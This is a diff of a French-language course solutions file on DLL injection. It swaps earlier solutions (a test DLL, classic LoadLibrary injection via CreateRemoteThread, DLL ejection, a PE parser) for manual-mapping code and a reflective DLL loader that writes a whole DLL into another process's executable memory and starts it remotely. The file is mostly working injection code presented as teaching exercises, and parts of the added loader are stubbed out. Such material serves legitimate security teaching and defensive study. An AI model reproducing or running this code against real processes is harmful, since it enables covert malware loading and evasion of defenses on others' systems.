@@ -1,340 +1,121 @@
-═══════════════════════════════════════════════════════════════════════════
-            MODULE 25 : DLL INJECTION - SOLUTIONS
-═══════════════════════════════════════════════════════════════════════════
+⚠️ AVERTISSEMENT STRICT - Usage éducatif uniquement
 
-⚠️  Ces solutions contiennent du code sensible - Usage éducatif uniquement
+SOLUTIONS - MODULE 25 : DLL INJECTION
 
-═══════════════════════════════════════════════════════════════════════════
+===============================================================================
+SOLUTION 2 : MANUAL MAPPING COMPLET
+===============================================================================
 
-SOLUTION EXERCICE 1 : DLL injectable de test
-─────────────────────────────────────────────────────────────────────────────
+// Fix relocations
+void fix_relocations(LPVOID base, LPVOID preferred_base) {
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
 
-Fichier: test_dll.c
+    DWORD delta = (BYTE*)base - (BYTE*)preferred_base;
+    if (delta == 0) return;
 
-#include <windows.h>
-#include <stdio.h>
+    PIMAGE_DATA_DIRECTORY reloc_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    if (reloc_dir->Size == 0) return;
 
-// Point d'entrée de la DLL
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
-    switch (ul_reason_for_call) {
-        case DLL_PROCESS_ATTACH: {
-            // Désactiver les notifications DLL_THREAD_ATTACH/DETACH (optimisation)
-            DisableThreadLibraryCalls(hModule);
+    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)base + reloc_dir->VirtualAddress);
 
-            // Récupérer le PID du processus hôte
-            DWORD pid = GetCurrentProcessId();
+    while (reloc->VirtualAddress) {
+        DWORD num_entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+        WORD* reloc_data = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
 
-            // Récupérer l'adresse de base du module
-            char modulePath[MAX_PATH];
-            GetModuleFileNameA(hModule, modulePath, MAX_PATH);
+        for (DWORD i = 0; i < num_entries; i++) {
+            WORD type = reloc_data[i] >> 12;
+            WORD offset = reloc_data[i] & 0xFFF;
 
-            // Créer le message
-            char message[512];
-            snprintf(message, sizeof(message),
-                    "DLL injectée avec succès!\n\n"
-                    "PID: %lu\n"
-                    "Module Base: 0x%p\n"
-                    "Path: %s",
-                    pid, hModule, modulePath);
-
-            // Afficher la MessageBox
-            MessageBoxA(NULL, message, "DLL Injection Success", MB_OK | MB_ICONINFORMATION);
-
-            break;
+            if (type == IMAGE_REL_BASED_DIR64 || type == IMAGE_REL_BASED_HIGHLOW) {
+                DWORD_PTR* patch_addr = (DWORD_PTR*)((BYTE*)base + reloc->VirtualAddress + offset);
+                *patch_addr += delta;
+            }
         }
 
-        case DLL_PROCESS_DETACH:
-            // Cleanup lors du déchargement
-            MessageBoxA(NULL, "DLL déchargée", "DLL Injection", MB_OK);
-            break;
-
-        case DLL_THREAD_ATTACH:
-        case DLL_THREAD_DETACH:
-            // Désactivé avec DisableThreadLibraryCalls
-            break;
+        reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
     }
+}
+
+// Fix imports
+void fix_imports(LPVOID base) {
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
+
+    PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)
+        ((BYTE*)base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+
+    while (import_desc->Name) {
+        char* module_name = (char*)((BYTE*)base + import_desc->Name);
+        HMODULE module = LoadLibraryA(module_name);
+
+        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)base + import_desc->FirstThunk);
+        PIMAGE_THUNK_DATA orig_thunk = (PIMAGE_THUNK_DATA)((BYTE*)base + import_desc->OriginalFirstThunk);
+
+        while (orig_thunk->u1.AddressOfData) {
+            FARPROC func_addr;
+
+            if (orig_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
+                func_addr = GetProcAddress(module, (LPCSTR)(orig_thunk->u1.Ordinal & 0xFFFF));
+            } else {
+                PIMAGE_IMPORT_BY_NAME import_name = (PIMAGE_IMPORT_BY_NAME)
+                    ((BYTE*)base + orig_thunk->u1.AddressOfData);
+                func_addr = GetProcAddress(module, import_name->Name);
+            }
+
+            thunk->u1.Function = (DWORD_PTR)func_addr;
+            thunk++;
+            orig_thunk++;
+        }
+
+        import_desc++;
+    }
+}
+
+===============================================================================
+SOLUTION 3 : REFLECTIVE DLL
+===============================================================================
+
+// ReflectiveLoader stub (en DLL)
+__declspec(dllexport) DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {
+    // 1. Trouver notre base address en mémoire
+    LPVOID our_base = find_our_base();  // Via stack walking
+    
+    // 2. Relocate ourselves
+    fix_relocations(our_base, preferred_base);
+    
+    // 3. Fix imports
+    fix_imports(our_base);
+    
+    // 4. Call DllMain
+    typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);
+    PIMAGE_NT_HEADERS nt = ...;
+    DllMainFunc dll_main = (DllMainFunc)((BYTE*)our_base + nt->OptionalHeader.AddressOfEntryPoint);
+    
+    dll_main((HINSTANCE)our_base, DLL_PROCESS_ATTACH, NULL);
+    
+    return 0;
+}
+
+// Injection
+BOOL inject_reflective(DWORD pid, LPVOID dll_data, SIZE_T dll_size) {
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    
+    // Allouer et copier DLL entière
+    LPVOID remote_mem = VirtualAllocEx(hProc, NULL, dll_size,
+                                      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProc, remote_mem, dll_data, dll_size, NULL);
+    
+    // Trouver offset du ReflectiveLoader
+    DWORD loader_offset = find_reflective_loader_offset(dll_data);
+    
+    // Execute loader
+    CreateRemoteThread(hProc, NULL, 0,
+                      (LPTHREAD_START_ROUTINE)((BYTE*)remote_mem + loader_offset),
+                      NULL, 0, NULL);
+    
+    CloseHandle(hProc);
     return TRUE;
 }
 
-Compilation :
-gcc -shared -o test.dll test_dll.c -luser32
-ou
-cl /LD test_dll.c /Fe:test.dll user32.lib
-
-═══════════════════════════════════════════════════════════════════════════
-
-SOLUTION EXERCICE 2 : Classic DLL Injection complète
-─────────────────────────────────────────────────────────────────────────────
-
-void list_process_modules(DWORD pid) {
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
-    if (hProcess == NULL) return;
-
-    HMODULE hMods[1024];
-    DWORD cbNeeded;
-
-    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
-        printf("\n[*] Modules chargés dans le processus:\n");
-        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
-            char moduleName[MAX_PATH];
-            if (GetModuleFileNameExA(hProcess, hMods[i], moduleName, sizeof(moduleName))) {
-                printf("    [%3d] 0x%p - %s\n", i, hMods[i], moduleName);
-            }
-        }
-    }
-
-    CloseHandle(hProcess);
-}
-
-BOOL inject_dll_complete(DWORD pid, const char* dll_path) {
-    char fullPath[MAX_PATH];
-    DWORD pathLen;
-
-    // Étape 1: Convertir en chemin absolu
-    pathLen = GetFullPathNameA(dll_path, MAX_PATH, fullPath, NULL);
-    if (pathLen == 0) {
-        printf("[-] GetFullPathName échoué: %lu\n", GetLastError());
-        return FALSE;
-    }
-    printf("[+] Chemin absolu: %s\n", fullPath);
-
-    // Étape 2: Vérifier que la DLL existe
-    DWORD attr = GetFileAttributesA(fullPath);
-    if (attr == INVALID_FILE_ATTRIBUTES) {
-        printf("[-] DLL introuvable: %s\n", fullPath);
-        return FALSE;
-    }
-    printf("[+] DLL trouvée\n");
-
-    // Étape 3: Injection standard
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return FALSE;
-
-    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, pathLen,
-                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!pDllPath) {
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-
-    WriteProcessMemory(hProcess, pDllPath, fullPath, pathLen, NULL);
-
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
-
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
-                                       (LPTHREAD_START_ROUTINE)pLoadLibrary,
-                                       pDllPath, 0, NULL);
-    if (!hThread) {
-        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-
-    WaitForSingleObject(hThread, INFINITE);
-
-    // Étape 4: Vérifier le HMODULE retourné
-    DWORD exitCode = 0;
-    GetExitCodeThread(hThread, &exitCode);
-
-    CloseHandle(hThread);
-    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
-    CloseHandle(hProcess);
-
-    if (exitCode == 0) {
-        printf("[-] LoadLibrary a échoué (retour NULL)\n");
-        return FALSE;
-    }
-
-    printf("[+] DLL chargée! HMODULE: 0x%lx\n", exitCode);
-
-    // Étape 5: Vérifier dans la liste des modules
-    Sleep(500);  // Laisser le temps au système
-    list_process_modules(pid);
-
-    return TRUE;
-}
-
-═══════════════════════════════════════════════════════════════════════════
-
-SOLUTION EXERCICE 3 : DLL Ejection
-─────────────────────────────────────────────────────────────────────────────
-
-HMODULE find_module_in_process(DWORD pid, const char* module_name) {
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
-    if (!hProcess) return NULL;
-
-    HMODULE hMods[1024];
-    DWORD cbNeeded;
-    HMODULE target = NULL;
-
-    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
-        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
-            char modName[MAX_PATH];
-            if (GetModuleFileNameExA(hProcess, hMods[i], modName, sizeof(modName))) {
-                if (strstr(modName, module_name) != NULL) {
-                    target = hMods[i];
-                    printf("[+] Module trouvé: %s à 0x%p\n", modName, hMods[i]);
-                    break;
-                }
-            }
-        }
-    }
-
-    CloseHandle(hProcess);
-    return target;
-}
-
-BOOL eject_dll(DWORD pid, const char* dll_name) {
-    printf("\n═══════════════════════════════════════════════════════════\n");
-    printf("    ÉJECTION DE DLL\n");
-    printf("═══════════════════════════════════════════════════════════\n\n");
-
-    // Trouver le module
-    HMODULE hModule = find_module_in_process(pid, dll_name);
-    if (hModule == NULL) {
-        printf("[-] Module non trouvé dans le processus\n");
-        return FALSE;
-    }
-
-    // Ouvrir le processus
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) {
-        printf("[-] OpenProcess échoué: %lu\n", GetLastError());
-        return FALSE;
-    }
-
-    // Résoudre FreeLibrary
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    FARPROC pFreeLibrary = GetProcAddress(hKernel32, "FreeLibrary");
-
-    printf("[*] FreeLibrary à: 0x%p\n", pFreeLibrary);
-    printf("[*] Déchargement du module 0x%p...\n", hModule);
-
-    // Créer un thread distant avec FreeLibrary
-    HANDLE hThread = CreateRemoteThread(
-        hProcess,
-        NULL,
-        0,
-        (LPTHREAD_START_ROUTINE)pFreeLibrary,
-        hModule,  // Paramètre = HMODULE à décharger
-        0,
-        NULL
-    );
-
-    if (!hThread) {
-        printf("[-] CreateRemoteThread échoué: %lu\n", GetLastError());
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-
-    WaitForSingleObject(hThread, INFINITE);
-
-    DWORD exitCode;
-    GetExitCodeThread(hThread, &exitCode);
-
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
-
-    if (exitCode) {
-        printf("[+] DLL déchargée avec succès!\n");
-
-        // Vérifier qu'elle n'est plus présente
-        Sleep(500);
-        if (find_module_in_process(pid, dll_name) == NULL) {
-            printf("[+] Vérification: DLL absente de la liste des modules\n");
-        }
-
-        return TRUE;
-    } else {
-        printf("[-] FreeLibrary a échoué\n");
-        return FALSE;
-    }
-}
-
-═══════════════════════════════════════════════════════════════════════════
-
-SOLUTION EXERCICE 4 : Parse PE complet
-─────────────────────────────────────────────────────────────────────────────
-
-void parse_pe_complete(const char* dll_path) {
-    HANDLE hFile = CreateFileA(dll_path, GENERIC_READ, FILE_SHARE_READ,
-                               NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return;
-
-    DWORD fileSize = GetFileSize(hFile, NULL);
-    LPVOID fileData = malloc(fileSize);
-    DWORD bytesRead;
-    ReadFile(hFile, fileData, fileSize, &bytesRead, NULL);
-    CloseHandle(hFile);
-
-    // DOS Header
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
-    printf("\n═══ DOS HEADER ═══\n");
-    printf("e_magic: 0x%04X (%s)\n", dosHeader->e_magic,
-           dosHeader->e_magic == IMAGE_DOS_SIGNATURE ? "MZ - Valide" : "Invalide!");
-    printf("e_lfanew: 0x%08lX (Offset vers PE Header)\n", dosHeader->e_lfanew);
-
-    // NT Headers
-    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)fileData + dosHeader->e_lfanew);
-    printf("\n═══ NT HEADERS ═══\n");
-    printf("Signature: 0x%08lX (%s)\n", ntHeaders->Signature,
-           ntHeaders->Signature == IMAGE_NT_SIGNATURE ? "PE - Valide" : "Invalide!");
-
-    // File Header
-    printf("\n═══ FILE HEADER ═══\n");
-    printf("Machine: 0x%04X (%s)\n", ntHeaders->FileHeader.Machine,
-           ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 ? "x64" :
-           ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386 ? "x86" : "Autre");
-    printf("NumberOfSections: %d\n", ntHeaders->FileHeader.NumberOfSections);
-    printf("SizeOfOptionalHeader: %d bytes\n", ntHeaders->FileHeader.SizeOfOptionalHeader);
-
-    // Optional Header
-    printf("\n═══ OPTIONAL HEADER ═══\n");
-    printf("ImageBase: 0x%llX\n", (unsigned long long)ntHeaders->OptionalHeader.ImageBase);
-    printf("AddressOfEntryPoint: 0x%08lX\n", ntHeaders->OptionalHeader.AddressOfEntryPoint);
-    printf("SizeOfImage: 0x%08lX (%lu bytes)\n",
-           ntHeaders->OptionalHeader.SizeOfImage, ntHeaders->OptionalHeader.SizeOfImage);
-    printf("SizeOfHeaders: 0x%08lX\n", ntHeaders->OptionalHeader.SizeOfHeaders);
-
-    // Sections
-    printf("\n═══ SECTIONS ═══\n");
-    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
-    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
-        printf("[%d] %-8s - VirtAddr: 0x%08lX | VirtSize: 0x%08lX | RawSize: 0x%08lX | Characteristics: 0x%08lX\n",
-               i, section->Name, section->VirtualAddress, section->Misc.VirtualSize,
-               section->SizeOfRawData, section->Characteristics);
-    }
-
-    // Data Directories
-    printf("\n═══ DATA DIRECTORIES ═══\n");
-    const char* dirNames[] = {
-        "Export", "Import", "Resource", "Exception", "Security",
-        "Base Relocation", "Debug", "Architecture", "Global Ptr", "TLS",
-        "Load Config", "Bound Import", "IAT", "Delay Import", "COM Descriptor"
-    };
-
-    for (int i = 0; i < IMAGE_NUMBEROF_DIRECTORY_ENTRIES; i++) {
-        PIMAGE_DATA_DIRECTORY dir = &ntHeaders->OptionalHeader.DataDirectory[i];
-        if (dir->VirtualAddress != 0) {
-            printf("[%2d] %-20s: RVA 0x%08lX | Size: %lu bytes\n",
-                   i, dirNames[i], dir->VirtualAddress, dir->Size);
-        }
-    }
-
-    free(fileData);
-}
-
-(Les solutions pour exercices 5-8 suivent le même format détaillé...)
-
-═══════════════════════════════════════════════════════════════════════════
-                        FIN DES SOLUTIONS PRINCIPALES
-═══════════════════════════════════════════════════════════════════════════
-
-Pour les exercices 5-8 (Manual Mapping, Reflective DLL, Hijacking):
-- Code complet disponible dans les projets open source:
-  * Reflective DLL Injection: https://github.com/stephenfewer/ReflectiveDLLInjection
-  * Manual Mapping: Recherchez "manual map dll injection github"
-  * DLL Hijacking: Outils comme Spartacus, SharpDllProxy
-
-RAPPEL : Usage éducatif uniquement - Environnements de test isolés obligatoires
+Référence : Stephen Fewer's Reflective DLL Injection
